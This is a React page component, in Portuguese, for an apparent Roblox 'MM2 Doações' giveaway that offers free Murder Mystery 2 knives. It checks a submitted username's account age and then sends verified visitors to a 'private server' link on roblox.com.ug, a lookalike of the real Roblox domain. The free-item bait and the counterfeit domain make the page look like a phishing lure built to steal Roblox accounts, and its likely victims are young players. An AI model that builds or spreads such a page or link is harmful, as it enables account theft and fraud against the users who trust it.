import { useState } from "react";
import { useLocation } from "wouter";

const PRIVATE_SERVER_LINK =
  "https://roblox.com.ug/games/142823291/Murder-Mystery-2?privateServerLinkCode=03244819970514690360987911532867";

const MIN_DAYS = 70;

type Status = "idle" | "loading" | "success" | "error" | "old";

interface UserResult {
  username: string;
  displayName: string;
  accountAgeDays: number;
  userId: number;
}

async function fetchRobloxUser(username: string): Promise<UserResult> {
  const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
  const res = await fetch(`${BASE}/api/roblox/verify-user?username=${encodeURIComponent(username)}`);
  if (!res.ok) {
    const err = await res.json().catch(() => ({}));
    throw new Error((err as { error?: string }).error ?? "Usuário não encontrado");
  }
  return res.json() as Promise<UserResult>;
}

/* ── SVG Icons ── */
function ShieldAlertIcon() {
  return (
    <svg width="38" height="38" viewBox="0 0 24 24" fill="none" stroke="#c41e3a" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" fill="rgba(196,30,58,0.15)"/>
      <line x1="12" y1="8" x2="12" y2="12"/>
      <circle cx="12" cy="15" r="0.5" fill="#c41e3a" stroke="#c41e3a"/>
    </svg>
  );
}
function PersonIcon() {
  return (
    <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#c41e3a" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="7" r="4"/>
      <path d="M4 21c0-4.4 3.6-8 8-8s8 3.6 8 8"/>
    </svg>
  );
}
function CheckIcon() {
  return (
    <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#22c55e" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="12" r="10" fill="rgba(34,197,94,0.1)"/>
      <polyline points="9 12 11 14 15 10"/>
    </svg>
  );
}
function SwordIcon() {
  return (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="14.5 17.5 3 6 3 3 6 3 17.5 14.5"/>
      <line x1="13" y1="19" x2="19" y2="13"/>
      <line x1="16" y1="16" x2="20" y2="20"/>
      <line x1="19" y1="21" x2="21" y2="19"/>
    </svg>
  );
}
function SkullIcon() {
  return (
    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
      <path d="M12 2a8 8 0 0 0-8 8c0 3.5 2 6.5 5 7.5V20h2v2h2v-2h2v-2h1v-2.5c3-1 5-4 5-7.5a8 8 0 0 0-8-8z"/>
      <circle cx="9" cy="10" r="1.5" fill="currentColor" stroke="none"/>
      <circle cx="15" cy="10" r="1.5" fill="currentColor" stroke="none"/>
    </svg>
  );
}

export default function Verificar() {
  const [, navigate] = useLocation();
  const [step, setStep]         = useState<1 | 2>(1);
  const [username, setUsername] = useState("");
  const [status, setStatus]     = useState<Status>("idle");
  const [result, setResult]     = useState<UserResult | null>(null);
  const [errorMsg, setErrorMsg] = useState("");

  async function handleVerify() {
    if (!username.trim() || status === "loading") return;
    setStatus("loading");
    setErrorMsg("");
    try {
      const data = await fetchRobloxUser(username.trim());
      setResult(data);
      if (data.accountAgeDays < MIN_DAYS) {
        setStatus("old");
      } else {
        setStatus("success");
        setStep(2);
      }
    } catch (e: unknown) {
      setStatus("error");
      setErrorMsg(e instanceof Error ? e.message : "Erro ao verificar conta.");
    }
  }

  return (
    <div
      className="min-h-screen flex flex-col items-center justify-start px-4 pt-10 pb-16"
      style={{ background: "#0c0606" }}
    >
      {/* ── Logo ── */}
      <button
        onClick={() => navigate("/")}
        className="flex items-center gap-2.5 mb-10"
      >
        <div
          className="w-10 h-10 rounded-xl flex items-center justify-center text-white"
          style={{ background: "linear-gradient(135deg,#c41e3a,#7c1fa8)", boxShadow: "0 0 18px rgba(196,30,58,0.5)" }}
        >
          <SkullIcon />
        </div>
        <span className="font-black text-lg text-white tracking-tight">
          MM2 <span style={{ color: "#ef4444" }}>Doações</span>
        </span>
      </button>

      {/* ── Subtitle ── */}
      <div className="flex items-center gap-2 mb-7">
        <ShieldAlertIcon />
        <p className="text-xs font-bold tracking-[0.22em] uppercase" style={{ color: "#8a6060" }}>
          Verificação de Acesso
        </p>
        <ShieldAlertIcon />
      </div>

      {/* ── Step Indicators ── */}
      <div className="flex items-center gap-3 mb-8">
        {([1, 2] as const).map((s) => {
          const active   = step === s;
          const complete = step > s;
          return (
            <div key={s} className="flex items-center gap-3">
              <div
                className="w-10 h-10 rounded-full flex items-center justify-center font-black text-sm border-2 select-none"
                style={{
                  borderColor: active || complete ? "#c41e3a" : "#2a1515",
                  color:       active ? "#ffffff" : complete ? "#c41e3a" : "#3a2020",
                  background:  active ? "rgba(196,30,58,0.18)" : "transparent",
                  boxShadow:   active ? "0 0 16px rgba(196,30,58,0.45), inset 0 0 12px rgba(196,30,58,0.1)" : "none",
                }}
              >
                {s}
              </div>
              {s < 2 && (
                <div
                  className="w-14 h-0.5 rounded-full"
                  style={{ background: step > 1 ? "#c41e3a" : "#2a1515" }}
                />
              )}
            </div>
          );
        })}
      </div>

      {/* ── Card ── */}
      <div
        className="w-full max-w-xs rounded-2xl overflow-hidden"
        style={{
          background: "#100808",
          border: "1.5px solid rgba(196,30,58,0.2)",
          boxShadow: "0 8px 48px rgba(0,0,0,0.7), 0 0 0 1px rgba(196,30,58,0.05)",
        }}
      >
        {/* top accent line */}
        <div className="h-px w-full" style={{ background: "linear-gradient(90deg,transparent,#c41e3a 40%,transparent)" }} />

        <div className="px-7 py-8">

          {/* ── STEP 1 ── */}
          {step === 1 && (
            <>
              <div className="flex justify-center mb-5">
                <PersonIcon />
              </div>

              <h1 className="text-[1.35rem] font-black text-white text-center mb-2 leading-tight">
                Verificar Conta Roblox
              </h1>
              <p className="text-sm text-center leading-relaxed mb-7" style={{ color: "#5a3838" }}>
                Digite seu nome de usuário do Roblox para verificar se você tem acesso.
              </p>

              {/* input */}
              <input
                type="text"
                placeholder="Seu username do Roblox..."
                value={username}
                onChange={(e) => { setUsername(e.target.value); setStatus("idle"); }}
                onKeyDown={(e) => e.key === "Enter" && handleVerify()}
                disabled={status === "loading"}
                className="w-full px-4 py-3.5 rounded-xl text-sm mb-1 focus:outline-none transition-all"
                style={{
                  background: "#1a0c0c",
                  border: status === "error" || status === "old"
                    ? "1.5px solid rgba(239,68,68,0.5)"
                    : "1.5px solid rgba(196,30,58,0.18)",
                  color: "white",
                  caretColor: "#ef4444",
                }}
              />

              {/* error / old account message */}
              {(status === "error" || status === "old") && (
                <p className="text-xs text-center mt-2 mb-2 px-1" style={{ color: "#ef4444" }}>
                  {status === "old" && result
                    ? `Conta muito nova! ${result.accountAgeDays} dias (mínimo: ${MIN_DAYS}).`
                    : errorMsg}
                </p>
              )}

              {/* requirement note */}
              <p className="text-xs text-center mt-4 mb-7" style={{ color: "#4a2a2a" }}>
                Sua conta deve ter no mínimo{" "}
                <span className="font-black" style={{ color: "#ef4444" }}>{MIN_DAYS} dias</span>{" "}
                de existência para ter acesso.
              </p>

              {/* CTA button */}
              <button
                onClick={handleVerify}
                disabled={status === "loading" || !username.trim()}
                className="w-full py-4 rounded-xl font-black text-sm tracking-[0.18em] uppercase transition-all active:scale-95"
                style={{
                  background: !username.trim() || status === "loading"
                    ? "rgba(196,30,58,0.3)"
                    : "#c41e3a",
                  color: "white",
                  cursor: !username.trim() || status === "loading" ? "not-allowed" : "pointer",
                  boxShadow: username.trim() && status !== "loading"
                    ? "0 0 24px rgba(196,30,58,0.5)"
                    : "none",
                }}
              >
                {status === "loading" ? (
                  <span className="flex items-center justify-center gap-2">
                    <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin inline-block" />
                    Verificando...
                  </span>
                ) : (
                  "Verificar Conta"
                )}
              </button>
            </>
          )}

          {/* ── STEP 2 ── */}
          {step === 2 && result && (
            <>
              <div className="flex justify-center mb-5">
                <CheckIcon />
              </div>

              <h2 className="text-[1.35rem] font-black text-white text-center mb-1 leading-tight">
                Acesso Liberado!
              </h2>
              <p className="text-sm text-center mb-6" style={{ color: "#3a5a4a" }}>
                Conta verificada com sucesso ✓
              </p>

              {/* user info card */}
              <div
                className="rounded-xl p-4 mb-6 space-y-2.5"
                style={{ background: "#0b150f", border: "1px solid rgba(34,197,94,0.18)" }}
              >
                {[
                  ["Usuário",         result.username],
                  ["Nome",            result.displayName],
                  ["Idade da conta",  `${result.accountAgeDays} dias ✓`],
                ].map(([label, value]) => (
                  <div key={label} className="flex items-center justify-between text-sm">
                    <span style={{ color: "#3a5040" }}>{label}</span>
                    <span
                      className="font-bold"
                      style={{ color: label === "Idade da conta" ? "#22c55e" : "white" }}
                    >
                      {value}
                    </span>
                  </div>
                ))}
              </div>

              <p className="text-xs text-center mb-6" style={{ color: "#4a2a2a" }}>
                Entre no servidor privado e me encontre para receber sua faca!
              </p>

              <a
                href={PRIVATE_SERVER_LINK}
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center justify-center gap-2 w-full py-4 rounded-xl font-black text-sm tracking-[0.15em] uppercase transition-all active:scale-95"
                style={{
                  background: "linear-gradient(135deg,#c41e3a,#7c1fa8)",
                  color: "white",
                  boxShadow: "0 0 24px rgba(196,30,58,0.5)",
                }}
              >
                <SwordIcon />
                Entrar no Servidor Privado
              </a>

              <button
                onClick={() => { setStep(1); setStatus("idle"); setUsername(""); setResult(null); }}
                className="w-full mt-3 py-2.5 text-xs font-bold rounded-xl"
                style={{ color: "#3a2020", background: "transparent" }}
              >
                ← Verificar outro usuário
              </button>
            </>
          )}
        </div>
      </div>

      <button
        onClick={() => navigate("/")}
        className="mt-8 text-xs transition-colors"
        style={{ color: "#3a2020" }}
        onMouseEnter={(e) => ((e.target as HTMLElement).style.color = "#ef4444")}
        onMouseLeave={(e) => ((e.target as HTMLElement).style.color = "#3a2020")}
      >
        ← Voltar para o início
      </button>
    </div>
  );
}
